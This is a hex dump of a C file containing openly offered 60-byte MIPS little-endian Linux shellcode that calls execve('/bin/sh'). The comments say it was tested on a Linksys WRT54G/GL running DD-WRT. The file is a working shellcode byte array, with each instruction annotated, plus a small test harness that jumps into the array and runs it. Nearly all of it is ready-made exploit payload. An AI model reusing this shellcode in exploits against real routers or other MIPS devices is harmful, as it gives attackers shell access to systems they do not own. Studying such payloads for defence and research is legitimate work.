00000000  2f 2a 09 2d 20 4d 49 50  53 20 6c 69 74 74 6c 65  |/*.- MIPS little|
00000010  2d 65 6e 64 69 61 6e 20  0d 0a 20 2a 09 2d 20 6c  |-endian .. *.- l|
00000020  69 6e 75 78 20 65 78 65  63 76 65 20 36 30 20 62  |inux execve 60 b|
00000030  79 74 65 73 20 73 68 65  6c 6c 63 6f 64 65 20 0d  |ytes shellcode .|
00000040  0a 20 2a 09 2d 20 65 78  65 63 76 65 28 22 2f 62  |. *.- execve("/b|
00000050  69 6e 2f 73 68 22 2c 5b  22 2f 62 69 6e 2f 73 68  |in/sh",["/bin/sh|
00000060  22 5d 2c 5b 5d 29 3b 0d  0a 20 2a 20 20 20 20 20  |"],[]);.. *     |
00000070  20 2d 20 74 65 73 74 65  64 20 6f 6e 20 4c 69 6e  | - tested on Lin|
00000080  6b 73 79 73 20 57 52 54  35 34 47 2f 47 4c 20 28  |ksys WRT54G/GL (|
00000090  44 44 2d 57 52 54 20 4c  69 6e 75 78 29 0d 0a 20  |DD-WRT Linux).. |
000000a0  2a 20 20 20 20 20 20 2d  20 62 61 73 65 64 20 6f  |*      - based o|
000000b0  6e 20 73 63 75 74 20 70  61 70 65 72 20 57 72 69  |n scut paper Wri|
000000c0  74 69 6e 67 20 4d 49 50  53 2f 49 72 69 78 20 73  |ting MIPS/Irix s|
000000d0  68 65 6c 6c 63 6f 64 65  0d 0a 20 2a 0d 0a 20 2a  |hellcode.. *.. *|
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 76 61  |              va|
00000100  69 63 65 62 69 6e 65 20  61 74 20 67 6d 61 69 6c  |icebine at gmail|
00000110  20 64 6f 74 20 63 6f 6d  0d 0a 20 2a 2f 0d 0a 23  | dot com.. */..#|
00000120  69 6e 63 6c 75 64 65 20  22 73 74 64 69 6f 2e 68  |include "stdio.h|
00000130  22 0d 0a 0d 0a 0d 0a 63  68 61 72 20 73 68 65 6c  |"......char shel|
00000140  6c 63 6f 64 65 5b 5d 20  3d 20 7b 0d 0a 09 22 5c  |lcode[] = {..."\|
00000150  78 35 30 5c 78 37 33 5c  78 30 36 5c 78 32 34 22  |x50\x73\x06\x24"|
00000160  20 2f 2a 20 20 20 20 20  6c 69 20 20 20 20 20 20  | /*     li      |
00000170  61 32 2c 30 78 37 33 35  30 20 20 20 20 20 20 20  |a2,0x7350       |
00000180  20 20 20 20 20 20 2a 2f  0d 0a 09 22 5c 78 66 66  |      */..."\xff|
00000190  5c 78 66 66 5c 78 64 30  5c 78 30 34 22 20 2f 2a  |\xff\xd0\x04" /*|
000001a0  20 4c 42 3a 20 62 6c 74  7a 61 6c 20 20 61 32 2c  | LB: bltzal  a2,|
000001b0  4c 42 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |LB              |
000001c0  20 20 20 2a 2f 0d 0a 09  22 5c 78 35 30 5c 78 37  |   */..."\x50\x7|
000001d0  33 5c 78 30 66 5c 78 32  34 22 20 2f 2a 20 20 20  |3\x0f\x24" /*   |
000001e0  20 20 6c 69 20 20 20 20  20 20 24 74 37 2c 30 78  |  li      $t7,0x|
000001f0  37 33 35 30 20 28 6e 6f  70 29 20 20 20 20 20 20  |7350 (nop)      |
00000200  2a 2f 0d 0a 09 22 5c 78  66 66 5c 78 66 66 5c 78  |*/..."\xff\xff\x|
00000210  30 36 5c 78 32 38 22 20  2f 2a 20 20 20 20 20 73  |06\x28" /*     s|
00000220  6c 74 69 20 20 20 20 61  32 2c 20 24 30 2c 2d 31  |lti    a2, $0,-1|
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
00000240  0a 09 22 5c 78 65 30 5c  78 66 66 5c 78 62 64 5c  |.."\xe0\xff\xbd\|
00000250  78 32 37 22 20 2f 2a 20  20 20 20 20 61 64 64 69  |x27" /*     addi|
00000260  75 20 20 20 73 70 2c 73  70 2c 2d 33 32 20 20 20  |u   sp,sp,-32   |
00000270  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 09 22  |          */..."|
00000280  5c 78 64 37 5c 78 66 66  5c 78 30 66 5c 78 32 34  |\xd7\xff\x0f\x24|
00000290  22 20 2f 2a 20 20 20 20  20 6c 69 20 20 20 20 20  |" /*     li     |
000002a0  20 74 37 2c 2d 34 31 20  20 20 20 20 20 20 20 20  | t7,-41         |
000002b0  20 20 20 20 20 20 20 2a  2f 0d 0a 09 22 5c 78 32  |       */..."\x2|
000002c0  37 5c 78 37 38 5c 78 65  30 5c 78 30 31 22 20 2f  |7\x78\xe0\x01" /|
000002d0  2a 20 20 20 20 20 6e 6f  72 20 20 20 20 20 74 37  |*     nor     t7|
000002e0  2c 74 37 2c 7a 65 72 6f  20 20 20 20 20 20 20 20  |,t7,zero        |
000002f0  20 20 20 20 2a 2f 20 20  20 20 0d 0a 09 22 5c 78  |    */    ..."\x|
00000300  32 31 5c 78 32 30 5c 78  65 66 5c 78 30 33 22 20  |21\x20\xef\x03" |
00000310  2f 2a 20 20 20 20 20 61  64 64 75 20 20 20 20 61  |/*     addu    a|
00000320  30 2c 72 61 2c 74 37 20  20 20 20 20 20 20 20 20  |0,ra,t7         |
00000330  20 20 20 20 20 2a 2f 0d  0a 09 22 5c 78 65 38 5c  |     */..."\xe8\|
00000340  78 66 66 5c 78 61 34 5c  78 61 66 22 20 2f 2a 20  |xff\xa4\xaf" /* |
00000350  20 20 20 20 73 77 20 20  20 20 20 20 61 30 2c 2d  |    sw      a0,-|
00000360  32 34 28 73 70 29 20 20  20 20 20 20 20 20 20 20  |24(sp)          |
00000370  20 20 2a 2f 0d 0a 09 22  5c 78 65 63 5c 78 66 66  |  */..."\xec\xff|
00000380  5c 78 61 30 5c 78 61 66  22 20 2f 2a 20 20 20 20  |\xa0\xaf" /*    |
00000390  20 73 77 20 20 20 20 20  20 7a 65 72 6f 2c 2d 32  | sw      zero,-2|
000003a0  30 28 73 70 29 20 20 20  20 20 20 20 20 20 20 2a  |0(sp)          *|
000003b0  2f 0d 0a 09 22 5c 78 65  38 5c 78 66 66 5c 78 61  |/..."\xe8\xff\xa|
000003c0  35 5c 78 32 33 22 20 2f  2a 20 20 20 20 20 61 64  |5\x23" /*     ad|
000003d0  64 69 20 20 20 20 61 31  2c 73 70 2c 2d 32 34 20  |di    a1,sp,-24 |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 20 20  |            */  |
000003f0  20 20 20 20 20 20 0d 0a  09 22 5c 78 61 62 5c 78  |      ..."\xab\x|
00000400  30 66 5c 78 30 32 5c 78  32 34 22 20 2f 2a 20 20  |0f\x02\x24" /*  |
00000410  20 20 20 6c 69 20 20 20  20 20 20 76 30 2c 34 30  |   li      v0,40|
00000420  31 31 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |11              |
00000430  20 2a 2f 0d 0a 09 22 5c  78 30 63 5c 78 30 31 5c  | */..."\x0c\x01\|
00000440  78 30 31 5c 78 30 31 22  20 2f 2a 20 20 20 20 20  |x01\x01" /*     |
00000450  73 79 73 63 61 6c 6c 20  20 20 20 20 20 20 20 20  |syscall         |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |              */|
00000470  0d 0a 09 22 2f 62 69 6e  2f 73 68 22 20 0d 0a 7d  |..."/bin/sh" ..}|
00000480  3b 0d 0a 0d 0a 69 6e 74  20 6d 61 69 6e 28 69 6e  |;....int main(in|
00000490  74 20 61 72 67 63 2c 20  63 68 61 72 20 2a 61 72  |t argc, char *ar|
000004a0  67 76 5b 5d 29 20 0d 0a  7b 0d 0a 09 76 6f 69 64  |gv[]) ..{...void|
000004b0  20 28 2a 70 29 28 76 6f  69 64 29 3b 0d 0a 09 70  | (*p)(void);...p|
000004c0  20 3d 20 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 09  | = shellcode;...|
000004d0  70 72 69 6e 74 66 28 22  73 68 65 6c 6c 63 6f 64  |printf("shellcod|
000004e0  65 20 73 69 7a 65 20 25  64 5c 6e 22 2c 20 73 69  |e size %d\n", si|
000004f0  7a 65 6f 66 28 73 68 65  6c 6c 63 6f 64 65 29 29  |zeof(shellcode))|
00000500  3b 0d 0a 09 70 28 29 3b  0d 0a 0d 0a 09 72 65 74  |;...p();.....ret|
00000510  75 72 6e 20 30 3b 0d 0a  7d                       |urn 0;..}|
00000519
